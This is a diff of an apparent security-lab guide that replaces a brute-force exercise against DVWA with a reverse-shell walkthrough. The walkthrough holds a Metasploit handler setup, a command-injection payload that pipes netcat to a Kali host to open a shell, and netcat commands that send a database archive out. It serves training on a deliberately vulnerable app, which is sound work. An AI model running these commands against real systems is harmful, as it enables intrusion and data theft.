@@ -1,28 +1,68 @@
-Brute Force Attacks
-===================
+Reverse Shell
+=============
 
-In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found. Alternatively, the attacker can attempt to guess the key which is typically created from the password using a key derivation function.
+A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall.
 
-#. Access Kali Linux through UDF Lab
-     In UDF -> Ansible Security Lab -> Components -> Kali -> Access -> Web Shell
-     
-     .. image:: ../images/Attacks/Picture1.png
-#. Web Shell should auto-login, then run the following commands
+#. Running a Command-and-Control Server in Kali
+     In the Kali Web Shell run the command:
+
+     .. code-block::
+
+       msfconsole
+
+     .. image:: ../images/Attacks/Picture12.png
+#. Running a ‘reverse-shell’ module on Kali
+     In the Kali Web Shell run the command:
+
+     .. code-block::
+
+       use exploit/multi/handler
+       set PAYLOAD linux/x64/shell/reverse_tcp
+       set LHOST 10.1.50.8
+       run
+      
+     .. image:: ../images/Attacks/Picture13.png
+#. Run reverse shell command from DVWA
+     In the XRDP Web Browser for DVWA run the command:
+
+     .. code-block::
+
+       | nc 10.1.50.8 4444 -e /bin/sh &
+
+     .. image:: ../images/Attacks/Picture14.png
+#. Execute shell commands from Kali
+     In the Kali Web Shell **Press Enter 1x prior to running commands**
+  
+     .. code-block::
+
+       pwd
+       ls -AlFh
+
+     .. image:: ../images/Attacks/Picture15.png
+#. Open a New Web Shell in Kali
+
+     .. image:: ../images/Attacks/Picture16.png
+#. Setup Data Exfiltration from Kali (2nd Web Shell [New Shell Window])
+
      .. code-block::
 
        cd /home/kali
-       ./hydra.sh
-      
-     .. image:: ../images/Attacks/Picture2.png
-#. Once the Script runs should output the username and password
+       rm Sample-DB.zip
+       nc -l -p 8888 > Sample-DB.zip
 
-     .. image:: ../images/Attacks/Picture3.png
+     .. image:: ../images/Attacks/Picture17.png
+#. Run Data Exfiltration command from Kali (1st Web Shell [Reverse Shell Window])
 
-#. Maximize the RDP Window and Login to the Web Server using the brute forced username and password from Kali
-     -  Username: admin
-     -  Password: password
+     .. code-block::
 
-     .. image:: ../images/Attacks/Picture4.png
-#. DVWA Website once logged in should look like below
+       nc -w 3 10.1.50.8 8888 < Sample-DB.zip
 
-     .. image:: ../images/Attacks/Picture5.png
+     .. image:: ../images/Attacks/Picture18.png
+#. Check Exfiltrated file on Kali from the compromised server (2nd Web Shell [New Shell Window])
+     If file has size (~93MB) then the data exfiltration was successful
+
+     .. code-block::
+
+       ls -AlFh |grep -I Sample
+
+     .. image:: ../images/Attacks/Picture19.png
